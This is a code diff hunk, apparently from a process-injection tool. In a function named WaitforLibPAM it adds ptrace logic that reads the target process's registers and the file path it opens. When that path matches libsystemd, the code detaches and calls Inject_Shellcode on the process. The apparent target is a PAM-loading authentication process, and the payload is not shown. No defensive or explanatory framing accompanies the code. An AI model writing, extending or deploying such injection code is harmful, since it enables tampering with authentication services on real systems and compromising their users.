@@ -113,6 +113,18 @@ int WaitforLibPAM(pid_t target_pid){
                 break;
             }
         }
+        if(num ==2){
+            ptrace_getregs( target_pid, &regs ) ;
+            printf("++ SubProcess: rdi :%p\n",regs.rdi);
+            ptrace_readdata(target_pid,(void *)regs.rdi,path,255);
+            printf("++ SubProcess:open path :%s\n",path);
+            if(strstr(path,libsystemd)){
+                ptrace_detach(target_pid);
+                Inject_Shellcode(target_pid);
+                break;
+            }
+        }
+
     }
 }
 
